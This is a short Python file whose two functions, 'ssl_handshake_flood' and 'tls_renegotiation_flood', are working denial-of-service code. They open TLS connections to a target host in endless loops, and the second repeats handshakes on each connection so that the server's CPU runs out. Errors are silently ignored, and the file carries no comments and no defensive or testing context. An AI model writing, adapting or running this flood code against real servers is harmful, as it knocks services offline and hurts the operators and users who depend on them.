import socket
import ssl
import threading

def ssl_handshake_flood(target, port, stop_event):
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS)
            ssock = ctx.wrap_socket(sock, server_hostname=target)
            ssock.connect((target, port))
            ssock.close()
        except:
            pass

def tls_renegotiation_flood(target, port, stop_event):
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS)
            ssock = ctx.wrap_socket(sock, server_hostname=target)
            ssock.connect((target, port))
            for _ in range(5):
                ssock.do_handshake()
            ssock.close()
        except:
            pass